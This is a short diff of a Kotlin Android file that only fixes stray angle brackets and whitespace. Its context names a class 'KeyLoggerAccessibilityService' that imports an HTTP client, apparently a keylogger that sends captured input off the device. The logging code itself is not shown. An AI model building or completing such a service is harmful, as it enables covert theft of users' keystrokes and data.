@@ -1,9 +1,9 @@
-<package com.mycompany.mobilesecv2
-
+package com.mycompany.mobilesecv2
+ 
 import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityEvent
 import android.util.Log
-
+ 
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
@@ -59,4 +59,4 @@ class KeyLoggerAccessibilityService : AccessibilityService() {
     }
 
     override fun onInterrupt() {}
-}>
+}
